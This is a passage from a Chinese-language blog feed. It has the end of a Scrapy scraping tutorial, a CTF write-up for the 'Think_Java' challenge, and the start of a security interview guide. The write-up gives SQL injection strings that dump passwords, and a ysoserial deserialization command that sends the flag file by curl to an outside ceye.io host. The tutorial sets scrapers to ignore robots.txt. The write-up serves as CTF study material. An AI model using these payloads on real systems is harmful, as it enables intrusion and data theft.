example example.comE:<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>python-project<span class="token punctuation">\</span>spider-project<span class="token operator">></span>cd qsbkE:<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>python-project<span class="token punctuation">\</span>spider-project<span class="token punctuation">\</span>qsbk<span class="token operator">></span>scrapy genspider demo <span class="token string">"qiushibaike.com"</span>Created spider <span class="token string">'demo'</span> using template <span class="token string">'basic'</span> <span class="token keyword">in</span> module:  qsbk.spiders.demo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>demo</code>即为爬虫的名字</p><h2 id="some-configuration-before-spider"><a href="#some-configuration-before-spider" class="headerlink" title="some configuration before spider"></a>some configuration before spider</h2><p>将<code>settings.py</code>中的<code>ROBOTSTXT_OBEY</code>设置为<code>False</code>，即不遵循robots协议</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># Obey robots.txt rules</span>ROBOTSTXT_OBEY <span class="token operator">=</span> <span class="token boolean">False</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>设置<code>UA</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">DEFAULT_REQUEST_HEADERS <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token string">'Accept'</span><span class="token punctuation">:</span> <span class="token string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span><span class="token punctuation">,</span>  <span class="token string">'Accept-Language'</span><span class="token punctuation">:</span> <span class="token string">'en'</span><span class="token punctuation">,</span>  <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4655.6 Safari/537.36'</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="meaning-of-files-in-the-project"><a href="#meaning-of-files-in-the-project" class="headerlink" title="meaning of files in the project"></a>meaning of files in the project</h2><p><code>item.py</code> - 设置要爬取的字段</p><p><code>pipelines.py</code> - 设置保存爬取内容</p><p><code>settings.py</code> - 设置文件，如User-Agent</p><h2 id="execute-the-spider"><a href="#execute-the-spider" class="headerlink" title="execute the spider"></a>execute the spider</h2><ol><li><p>cmd </p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">E:<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>python-project<span class="token punctuation">\</span>spider-project<span class="token punctuation">\</span>qsbk<span class="token operator">></span>scrapy crawl demo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>在<code>qsbk</code>中新建<code>start.py</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> scrapy <span class="token keyword">import</span> cmdlinecmdline<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"scrapy crawl demo"</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="coding-get-糗事百科段子"><a href="#coding-get-糗事百科段子" class="headerlink" title="coding - get 糗事百科段子"></a>coding - get 糗事百科段子</h2><p><code>demo.py</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> scrapy<span class="token keyword">from</span> qsbk<span class="token punctuation">.</span>items <span class="token keyword">import</span> QsbkItem<span class="token keyword">class</span> <span class="token class-name">DemoSpider</span><span class="token punctuation">(</span>scrapy<span class="token punctuation">.</span>Spider<span class="token punctuation">)</span><span class="token punctuation">:</span>    name <span class="token operator">=</span> <span class="token string">'demo'</span>    allowed_domains <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'qiushibaike.com'</span><span class="token punctuation">]</span>    start_urls <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'https://www.qiushibaike.com/text/page/1/'</span><span class="token punctuation">]</span>    <span class="token keyword">def</span> <span class="token function">parse</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">:</span>        divs <span class="token operator">=</span> response<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'//*[@id="content"]/div/div[2]/div'</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> each <span class="token keyword">in</span> divs<span class="token punctuation">:</span>            author <span class="token operator">=</span> each<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'./div[1]/a[2]/h2/text()'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>author<span class="token punctuation">)</span>            content <span class="token operator">=</span> each<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'./a[1]/div/span//text()'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getall<span class="token punctuation">(</span><span class="token punctuation">)</span>            content <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>            item <span class="token operator">=</span> QsbkItem<span class="token punctuation">(</span>author<span class="token operator">=</span>author<span class="token punctuation">,</span> content<span class="token operator">=</span>content<span class="token punctuation">)</span>            <span class="token comment"># 将数据移交给pipelines处理</span>            <span class="token keyword">yield</span> item        next_url <span class="token operator">=</span> response<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'//ul[@class="pagination"]/li[last()]/a/@href'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> next_url<span class="token punctuation">:</span>            <span class="token keyword">return</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">yield</span> scrapy<span class="token punctuation">.</span>Request<span class="token punctuation">(</span><span class="token string">"https://www.qiushibaike.com/"</span><span class="token operator">+</span>next_url<span class="token punctuation">,</span> callback<span class="token operator">=</span>self<span class="token punctuation">.</span>parse<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>items.py</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># Define here the models for your scraped items</span><span class="token comment">#</span><span class="token comment"># See documentation in:</span><span class="token comment"># https://docs.scrapy.org/en/latest/topics/items.html</span><span class="token keyword">import</span> scrapy<span class="token keyword">class</span> <span class="token class-name">QsbkItem</span><span class="token punctuation">(</span>scrapy<span class="token punctuation">.</span>Item<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># define the fields for your item here like:</span>    <span class="token comment"># name = scrapy.Field()</span>    author <span class="token operator">=</span> scrapy<span class="token punctuation">.</span>Field<span class="token punctuation">(</span><span class="token punctuation">)</span>    content <span class="token operator">=</span> scrapy<span class="token punctuation">.</span>Field<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>pipelines.py</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># Define your item pipelines here</span><span class="token comment">#</span><span class="token comment"># Don't forget to add your pipeline to the ITEM_PIPELINES setting</span><span class="token comment"># See: https://docs.scrapy.org/en/latest/topics/item-pipeline.html</span><span class="token comment"># useful for handling different item types with a single interface</span><span class="token keyword">from</span> itemadapter <span class="token keyword">import</span> ItemAdapter<span class="token keyword">from</span> scrapy<span class="token punctuation">.</span>exporters <span class="token keyword">import</span> JsonLinesItemExporter<span class="token keyword">class</span> <span class="token class-name">QsbkPipeline</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>fp <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"duanzi.json"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>exporter <span class="token operator">=</span> JsonLinesItemExporter<span class="token punctuation">(</span>self<span class="token punctuation">.</span>fp<span class="token punctuation">,</span> ensure_ascii<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token comment"># 启动爬虫时调用的函数</span>    <span class="token keyword">def</span> <span class="token function">open_spider</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> spider<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span>    <span class="token comment"># 当有item传过来时被调用</span>    <span class="token keyword">def</span> <span class="token function">process_item</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> item<span class="token punctuation">,</span> spider<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>exporter<span class="token punctuation">.</span>export_item<span class="token punctuation">(</span>item<span class="token punctuation">)</span>        <span class="token keyword">return</span> item    <span class="token comment"># 爬虫完成时调用的函数</span>    <span class="token keyword">def</span> <span class="token function">close_spider</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> spider<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>fp<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>想要<code>pipelines</code>运行，需要在<code>settings</code>中<code>ITEM_PIPELINES</code>取消注释</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">ITEM_PIPELINES <span class="token operator">=</span> <span class="token punctuation">&#123;</span>   <span class="token string">'qsbk.pipelines.QsbkPipeline'</span><span class="token punctuation">:</span> <span class="token number">300</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>300</code>指优先级数字，可以自己修改，因为该项目中只有一个爬虫，所以不需要修改</p><p><code>DOWNLOAD_DELAY</code>可以设置爬虫延时，防止爬取过快</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">DOWNLOAD_DELAY <span class="token operator">=</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><h2 id="CrawlSpider"><a href="#CrawlSpider" class="headerlink" title="CrawlSpider"></a>CrawlSpider</h2><p>继承自<code>spider</code>，增加了新的功能，可以定义爬取的url的规则，使scrapy碰到满足条件的url都进行爬取，而不需要手动<code>yield Request</code></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">scrapy startproject wxapp<span class="token builtin class-name">cd</span> wxappscrapy genspider -t crawl wxapp_spider <span class="token string">"wxapp-union.com"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>wxapp_spider.py</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> scrapy<span class="token keyword">from</span> scrapy<span class="token punctuation">.</span>linkextractors <span class="token keyword">import</span> LinkExtractor<span class="token keyword">from</span> scrapy<span class="token punctuation">.</span>spiders <span class="token keyword">import</span> CrawlSpider<span class="token punctuation">,</span> Rule<span class="token keyword">from</span> wxapp<span class="token punctuation">.</span>items <span class="token keyword">import</span> WxappItem<span class="token keyword">class</span> <span class="token class-name">WxappSpiderSpider</span><span class="token punctuation">(</span>CrawlSpider<span class="token punctuation">)</span><span class="token punctuation">:</span>    name <span class="token operator">=</span> <span class="token string">'wxapp_spider'</span>    allowed_domains <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'wxapp-union.com'</span><span class="token punctuation">]</span>    start_urls <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'https://www.wxapp-union.com/portal.php?mod=list&amp;catid=2&amp;page=1'</span><span class="token punctuation">]</span>    rules <span class="token operator">=</span> <span class="token punctuation">(</span>        Rule<span class="token punctuation">(</span>LinkExtractor<span class="token punctuation">(</span>allow<span class="token operator">=</span><span class="token string">r'.+mod=list&amp;catid=2&amp;page=\d'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> follow<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        Rule<span class="token punctuation">(</span>LinkExtractor<span class="token punctuation">(</span>allow<span class="token operator">=</span><span class="token string">r'article-.+\.html'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> callback<span class="token operator">=</span><span class="token string">"parse_detail"</span><span class="token punctuation">,</span> follow<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">parse_detail</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">:</span>        title <span class="token operator">=</span> response<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'//*[@id="ct"]/div[1]/div/div[1]/div/div[2]/div[1]/h1/text()'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>        p_label <span class="token operator">=</span> response<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'//p[@class="authors"]'</span><span class="token punctuation">)</span>        author <span class="token operator">=</span> p_label<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'./a/text()'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>        pub_time <span class="token operator">=</span> p_label<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'./span/text()'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>        content <span class="token operator">=</span> response<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'//td[@id="article_content"]//text()'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getall<span class="token punctuation">(</span><span class="token punctuation">)</span>        content <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>        item <span class="token operator">=</span> WxappItem<span class="token punctuation">(</span>title<span class="token operator">=</span>title<span class="token punctuation">,</span> author<span class="token operator">=</span>author<span class="token punctuation">,</span> pub_time<span class="token operator">=</span>pub_time<span class="token punctuation">,</span> content<span class="token operator">=</span>content<span class="token punctuation">)</span>        <span class="token keyword">yield</span> item<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>LinkExtractor链接提取器中注意<code>allow</code>（想要爬取的url规则），<code>follow</code>（在当前页面中碰到同样规则的url是否需要继续跟进爬取），<code>callback</code>（对于爬取到的页面要执行的回调函数）</p></blockquote><h2 id="scrapy-shell"><a href="#scrapy-shell" class="headerlink" title="scrapy shell"></a>scrapy shell</h2><p>进入项目文件夹</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">E:\Desktop\python<span class="token operator">-</span>project\spider<span class="token operator">-</span>project>cd wxappE:\Desktop\python<span class="token operator">-</span>project\spider<span class="token operator">-</span>project\wxapp><span class="token function">dir</span> 驱动器 E 中的卷是 资料 卷的序列号是 969F<span class="token operator">-</span>746D E:\Desktop\python<span class="token operator">-</span>project\spider<span class="token operator">-</span>project\wxapp 的目录2021<span class="token operator">/</span>10<span class="token operator">/</span>10  12:03    &lt;<span class="token function">DIR</span>>          <span class="token punctuation">.</span>2021<span class="token operator">/</span>10<span class="token operator">/</span>10  12:03    &lt;<span class="token function">DIR</span>>          <span class="token punctuation">.</span><span class="token punctuation">.</span>2021<span class="token operator">/</span>10<span class="token operator">/</span>10  11:44    &lt;<span class="token function">DIR</span>>          <span class="token punctuation">.</span>idea2021<span class="token operator">/</span>10<span class="token operator">/</span>10  11:07               253 scrapy<span class="token punctuation">.</span>cfg2021<span class="token operator">/</span>10<span class="token operator">/</span>10  11:26                82 <span class="token function">start</span><span class="token punctuation">.</span>py2021<span class="token operator">/</span>10<span class="token operator">/</span>10  12:03    &lt;<span class="token function">DIR</span>>          wxapp2021<span class="token operator">/</span>10<span class="token operator">/</span>10  12:03            82<span class="token punctuation">,</span>049 wxjc<span class="token punctuation">.</span>json               3 个文件         82<span class="token punctuation">,</span>384 字节               4 个目录 181<span class="token punctuation">,</span>172<span class="token punctuation">,</span>838<span class="token punctuation">,</span>400 可用字节E:\Desktop\python<span class="token operator">-</span>project\spider<span class="token operator">-</span>project\wxapp>scrapy shell https:<span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>wxapp<span class="token operator">-</span>union<span class="token punctuation">.</span>com<span class="token operator">/</span>article<span class="token operator">-</span>7167<span class="token operator">-</span>1<span class="token punctuation">.</span>html>>> response<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'//h1[@class="ph"]//text()'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token string">'微信小程序开发时absolute定位偏移和宽高问题 '</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Learning_Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> spider </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯_2020_朱雀组_Think_Java</title>
      <link href="/2021/08/23/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Think-Java/"/>
      <url>/2021/08/23/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Think-Java/</url>
      
        <content type="html"><![CDATA[<p>题目链接：<a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p><h2 id="1-打开下载的class文件"><a href="#1-打开下载的class文件" class="headerlink" title="1. 打开下载的class文件"></a>1. 打开下载的class文件</h2><p>使用IDEA打开可得到java源码</p><h2 id="2-swagger-ui-html"><a href="#2-swagger-ui-html" class="headerlink" title="2. swagger-ui.html"></a>2. swagger-ui.html</h2><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/CTF-files/think_java.png"></p><p>注意到<code>import io.swagger.annotations.ApiOperation;</code> 可以访问/swagger-ui.html</p><p>看到下方路由地址<code>/common/test/sqlDict</code> 执行了<code>getTableData</code>函数，跟踪发现<code>dbName</code>参数存在sql注入</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/CTF-files/think_java_f2.png"></p><p>再看其调用的<code>getConnection</code>函数，使用<code>jdbc</code>链接数据库</p><blockquote><p>jdbc连接数据库语句后面可以跟参数，所以</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">jdbc:mysql://localhost:3306/myapp<span class="token comment">#' union select 1#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN@master/CTF-files/think_java_f3.png"></p><h2 id="3-SQL注入"><a href="#3-SQL注入" class="headerlink" title="3. SQL注入"></a>3. SQL注入</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment"># 得到表名</span>jdbc:mysql://localhost:3306/myapp<span class="token comment">#' UNION SELECT group_concat(table_name) from information_schema.tables where table_schema=database()#</span><span class="token comment"># 得到列名</span>jdbc:mysql://localhost:3306/myapp<span class="token comment">#' UNION SELECT group_concat(column_name) from information_schema.columns where table_name='user'#</span><span class="token comment"># 得到数据</span>jdbc:mysql://localhost:3306/myapp<span class="token comment">#' UNION SELECT pwd from user#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时得到密码 <code>admin@Rrrr_ctf_asde</code></p><h2 id="4-反序列化"><a href="#4-反序列化" class="headerlink" title="4. 反序列化"></a>4. 反序列化</h2><p>登陆请求包发送之后，得到的响应体如下</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"data"</span><span class="token operator">:</span> <span class="token string">"Bearer rO0ABXNyABhjbi5hYmMuY29yZS5tb2RlbC5Vc2VyVm92RkMxewT0OgIAAkwAAmlkdAAQTGphdmEvbGFuZy9Mb25nO0wABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyAA5qYXZhLmxhbmcuTG9uZzuL5JDMjyPfAgABSgAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAAAAAAAXQABWFkbWlu"</span><span class="token punctuation">,</span>  <span class="token property">"msg"</span><span class="token operator">:</span> <span class="token string">"登录成功"</span><span class="token punctuation">,</span>  <span class="token property">"status"</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token property">"timestamps"</span><span class="token operator">:</span> <span class="token number">1629722881931</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>一段数据以<code>rO0AB</code>开头，你基本可以确定这串就是Java序列化base64加密的数据。<br>或者如果以<code>aced</code>开头，那么他就是这一段Java序列化的16进制。</p></blockquote><p>于是思路为在路由地址<code>/common/user/current</code> 发送base64加密后的序列化的payload</p><h5 id="利用ysoserial生成序列化的payload"><a href="#利用ysoserial生成序列化的payload" class="headerlink" title="利用ysoserial生成序列化的payload"></a>利用<code>ysoserial</code>生成序列化的payload</h5><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">E:<span class="token punctuation">\</span>Desktop<span class="token operator">></span>F:<span class="token punctuation">\</span>Java<span class="token punctuation">\</span>jre1.8<span class="token punctuation">\</span>bin<span class="token punctuation">\</span>java.exe -jar ysoserial-master-8eb5cbfbf6-1.jar ROME <span class="token string">"curl -d @/flag http://x.ceye.io/"</span> <span class="token operator">></span> a.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>payload为使用curl命令将flag文件内容发送至ceye平台</p></blockquote><h5 id="将其base64加密"><a href="#将其base64加密" class="headerlink" title="将其base64加密"></a>将其base64加密</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64s <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"a.txt"</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    s <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将数据在<code>/common/user/current</code>发送即可得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN@master/CTF-files/think_java_f4.png"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安全从业者面试指南</title>
      <link href="/2021/08/22/%E5%AE%89%E5%85%A8%E4%BB%8E%E4%B8%9A%E8%80%85/"/>
      <url>/2021/08/22/%E5%AE%89%E5%85%A8%E4%BB%8E%E4%B8%9A%E8%80%85/</url>
      
        <content type="html"><![CDATA[<p>关于安全行业面试的一些题目收集，关于简历</p><h2 id="好的简历"><a href="#好的简历" class="headerlink" title="好的简历"></a>好的简历</h2><ul><li>基本信息<strong>清晰</strong>：姓名、ID、性别、年龄、教育背景（毕业院校、专业、时间）、联系方式、期望地点</li><li>较完整的工作经历&amp;重大项目经验：注意空档期、工作业绩、重大项目担任的角色、分工与主要成果、公司行业知名度、个人管理经验</li><li><strong>体现</strong>技术能力：主要的技术栈以及能佐证的事情</li><li>其它<strong>优势</strong>：职业证书、奖项、会议分享、开源项目等</li><li>工作期望和方向：希望得到一个什么样的工作或自己专注的方向</li><li>个人评价：全方位的总结，展示出自己的专业技能掌握程度、亮点、优势等等</li><li>加分项<ul><li>使用PDF格式，简洁不花哨</li><li>有GitHub并参与过开源项目，可以写一些自己做过的小项目放上去</li><li>有个人博客，会写一些经验和问题的解决思路</li><li>邮箱使用gmail、foxmail或技术类邮箱（<a href="http://php.net/">php.net</a>）、私人域名邮箱等</li></ul></li><li>询问面试官对于自己的评价和可以改进的地方</li></ul><h2 id="面试题目"><a href="#面试题目" class="headerlink" title="面试题目"></a>面试题目</h2><h4 id="基础素质问题"><a href="#基础素质问题" class="headerlink" title="基础素质问题"></a>基础素质问题</h4><ul><li>对前面几轮面试官的看法如何？（HR问题，考察对他人评价）</li><li>前几次面试中，你有了解到这个岗位的工作职责和目标要求是什么吗？（HR问题）</li><li>对于异地工作你是怎么考虑的？（HR问题）</li><li>离职原因？为什么这个阶段要裸辞？（HR问题）<br>   提示：不要有太多消极负面东西，点到为止。提及原公司看法时，应当客观正面，切勿有个人情绪，尤其避免对上司、同事的抱怨。</li><li>薪资相关问题（HR问题）<br>   提示：如果面试官未谈及薪资问题，切勿主动提及。回答薪资相关问题时，在保证自己基本利益的前提下，表达自己的诉求，但一定不要把话说死，给后续谈判保留空间。相信企业会给自己一个合理的回报。</li><li>遇到解决不了的问题怎么做？工作中遇到最大的挑战是什么，如何解决的？(考察学习能力和动手解决能力)</li><li>业余时间会干嘛？(考察技术热情)<br>   提示：真实表达。可从乌云、翻墙、写技术博客、参与开源、常浏览的网站、关于黑客电视剧、关注业内牛人等角度。</li><li>自认为自己比身边人的优势和不足是什么？（客观的自我评价，讲自己没有缺点的基本可以不要了。挖掘亮点，如何客观看待自己）</li><li>别人对你最负面的评价是什么？你自己如何看待？</li><li>最有成就感的事情？（考察价值观）</li><li>未来职业规划？也可以问长期和中短期规划各是什么？（长远思考）</li><li>还有什么要问我的吗？（了解面试者所关心的侧重点）<br>   提示：可以选择有关企业发展、所应聘岗位定位相关问题，让面试官能感觉到你在关心公司发展和岗位兴趣。避免问题过多过细，也避免没有问题。</li></ul><h4 id="渗透测试（Web方向）"><a href="#渗透测试（Web方向）" class="headerlink" title="渗透测试（Web方向）"></a>渗透测试（Web方向）</h4><p>1、为何一个MYSQL数据库的站，只有一个80端口开放？</p><blockquote><p>更改了端口，没有扫描出来；</p><p>站库分离；</p><p>3306端口不对外开放</p></blockquote><p>2、一个成熟并且相对安全的CMS，渗透时扫目录的意义？</p><blockquote><p>敏感文件、二级目录扫描；</p><p>站长的误操作比如：网站备份的压缩文件、说明.txt、二级目录可能存放着其他站点</p></blockquote><p>3、在某后台新闻编辑界面看到编辑器，应该先做什么？</p><blockquote><p>查看编辑器的名称版本，然后搜索公开的漏洞。 </p></blockquote><p>4、审查上传点的元素有什么意义？</p><blockquote><p>有些站点的上传文件类型限制是在前端实现的，这时只要增加上传类型就能突破限制了</p></blockquote><p>5、CSRF、XSS及XXE有什么区别，以及修复方式？</p><blockquote><p>XSS是跨站脚本攻击，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。修复方式：对字符实体进行转义、使用HTTP Only来禁止JavaScript读取Cookie值、输入时校验、浏览器与Web应用端采用相同的字符编码。</p><p>CSRF是跨站请求伪造攻击，XSS是实现CSRF的诸多手段中的一种，是由于没有在关键操作执行时进行是否由用户自愿发起的确认。修复方式：筛选出需要防范CSRF的页面然后嵌入Token、再次输入密码、检验Referer。</p><p>XXE是XML外部实体注入攻击，XML中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。修复方式：XML解析库在调用时严格禁止对外部实体的解析。</p></blockquote><p>6、3389无法连接的几种情况</p><blockquote><p>没开放3389端口</p><p>端口被修改</p><p>防护拦截</p><p>处于内网(需进行端口转发)</p></blockquote><p>7、列举出owasp top10 